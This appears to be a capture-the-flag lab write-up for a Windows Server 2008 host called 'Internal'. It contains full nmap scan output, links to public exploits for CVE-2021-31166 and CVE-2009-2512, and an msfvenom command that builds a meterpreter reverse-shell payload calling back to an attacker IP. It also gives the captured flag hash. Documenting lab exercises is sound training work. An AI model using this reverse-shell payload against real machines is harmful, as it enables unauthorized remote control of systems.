# Win - Internal

---

### Host

```bash
192.168.238.40
```

### Scan

```bash
# Nmap 7.95 scan initiated Sat Feb  1 02:59:50 2025 as: /usr/lib/nmap/nmap --privileged -sCV -A -Pn -O -p- -oN nmap.md 192.168.238.40
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)

135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-02-01T08:01:51+00:00
|_ssl-date: 2025-02-01T08:01:59+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=internal
| Not valid before: 2024-08-01T16:21:33
|_Not valid after:  2025-01-31T16:21:33

5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable

49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m39s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-01T00:01:51-08:00
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:42:db (VMware)
| smb2-time: 
|   date: 2025-02-01T08:01:51
|_  start_date: 2024-08-02T16:21:30
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required

PORT     STATE         SERVICE     REASON
53/udp   open          domain      udp-response ttl 125
137/udp  open          netbios-ns  udp-response ttl 125
138/udp  open|filtered netbios-dgm no-response
500/udp  open|filtered isakmp      no-response
4500/udp open|filtered nat-t-ike   no-response
```

---

## Walkthrough

- Try nslookup, dig port 53, no info found.
- Try smbclient on port 139 & 445, no info found.
- Try rdp on 3389, no connection.

- Try access IP:5357, no page.
- Search “port 5357 tcp used for windows, what purpose” → we get information about this port is used for “Web Services for Devices (WSDAPI)”. Search exploit for it.

- On github, we found two resources:
    - https://github.com/ZZ-SOCMAP/CVE-2021-31166
    - https://github.com/0vercl0k/CVE-2021-31166
- However, it verify the vulnerability (PoC), not giving us a reverse shell.

- Keep searching, find another one, CVE-2009-2512 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-2512
- Search that CVE number, expoitDB comes up - https://www.exploit-db.com/exploits/40280

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.170 LPORT=6767  EXITFUNC=thread  -f python

> exploit.py

> msfconsole
```

![image.png](Win%20-%20Internal%2018d553bebf0f80da9686fc9634d9ba92/image.png)

![image.png](Win%20-%20Internal%2018d553bebf0f80da9686fc9634d9ba92/image%201.png)

![image.png](Win%20-%20Internal%2018d553bebf0f80da9686fc9634d9ba92/image%202.png)

![image.png](Win%20-%20Internal%2018d553bebf0f80da9686fc9634d9ba92/image%203.png)

### FLAG

```bash
- proof.txt : ab202e7d888f83f94d642386be748725
```